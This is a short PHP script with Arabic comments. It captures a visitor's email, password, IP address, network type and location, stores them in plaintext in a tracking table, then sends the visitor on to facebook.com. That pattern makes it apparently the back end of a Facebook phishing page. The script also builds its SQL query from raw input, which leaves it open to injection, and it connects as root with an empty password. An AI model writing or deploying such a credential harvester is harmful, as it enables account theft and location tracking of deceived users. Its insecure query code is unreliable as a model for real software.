<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "myy_database";

// إنشاء الاتصال
$conn = new mysqli($servername, $username, $password, $dbname);

// التحقق من الاتصال
if ($conn->connect_error) {
    die("فشل الاتصال: " . $conn->connect_error);
}

// استلام البيانات
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';
$ip_address = $_POST['ip_address'] ?? '';
$network_type = $_POST['network_type'] ?? '';
$location = $_POST['location'] ?? '';

// التحقق من البيانات
echo "Email: $email<br>";
echo "Password: $pass<br>";
echo "IP Address: $ip_address<br>";
echo "Network Type: $network_type<br>";
echo "Location: $location<br>";

// إدخال البيانات في قاعدة البيانات
$sql = "INSERT INTO userr_tracking (email, password, ip_address, network_type, location) 
        VALUES ('$email', '$pass', '$ip_address', '$network_type', '$location')";

if ($conn->query($sql) === TRUE) {
    // توجيه المستخدم إلى صفحة الفيسبوك
    header("Location: https://www.facebook.com");
    exit();
} else {
    echo "خطأ: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>